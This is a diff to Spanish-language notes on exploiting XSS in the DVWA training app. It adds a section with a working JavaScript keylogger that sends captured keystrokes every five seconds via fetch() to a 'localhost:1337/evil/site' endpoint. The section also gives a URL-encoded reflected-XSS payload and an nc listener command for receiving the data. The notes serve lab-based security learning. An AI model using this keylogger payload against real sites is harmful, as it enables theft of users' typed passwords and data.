@@ -88,6 +88,8 @@ De igual manera, el caracter `'` solo se reemplaza cuando la flag ` ENT_QUOTES` 
 
 Me parece que esto no se puede romper con HTML, pero seria vulnerable a SQL injection en todo caso, ya que podemos usar `'` y `\` (ya que no hay un `strip_slashes`)
 
+Capaz igual estoy equivocado, sigo pensando
+
 ## XSS stored
 
 ### Easy version
@@ -165,3 +167,36 @@ Si le ponemos un espacio antes del `>` (como antes), tiene el mismo efecto el ta
 ### Hard version
 
 No pareciera ser rompible, pero pensando aun
+
+
+# Leakear los keystrokes del usuario
+
+Codigo para atrapar las keys del user
+
+```
+<script>
+var keys = '';
+ 
+document.onkeypress = function(e) {
+   var get = window.event ? event : e;
+   var key = get.keyCode ? get.keyCode : get.charCode;
+   key = String.fromCharCode(key);
+   keys += key;
+}
+ 
+window.setInterval(function(){
+   fetch('http://localhost:1337/evil/site?key=' + keys);
+   keys = '';
+}, 5000);
+</script>
+```
+
+En vez de mandar `alert(1)`, podemos mandar el url encode del codigo de arriba, por ejemplo
+
+`
+http://192.168.1.20/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3E%0Avar%20keys%20%3D%20%27%27%3B%0A%20%0Adocument%2Eonkeypress%20%3D%20function%28e%29%20%7B%0A%20%20%20var%20get%20%3D%20window%2Eevent%20%3F%20event%20%3A%20e%3B%0A%20%20%20var%20key%20%3D%20get%2EkeyCode%20%3F%20get%2EkeyCode%20%3A%20get%2EcharCode%3B%0A%20%20%20key%20%3D%20String%2EfromCharCode%28key%29%3B%0A%20%20%20keys%20%2B%3D%20key%3B%0A%7D%0A%20%0Awindow%2EsetInterval%28function%28%29%7B%0A%20%20%20fetch%28%27http%3A%2F%2Flocalhost%3A1337%2Fevil%2Fsite%3Fkey%3D%27%20%2B%20keys%29%3B%0A%20%20%20keys%20%3D%20%27%27%3B%0A%7D%2C%205000%29%3B%0A%3C%2Fscript%3E
+`
+
+(Puede abrir escuchar la request haciendo `nc -lvp 1337`)
+
+Este ataque aplica a cualquier ataque detallado arriba
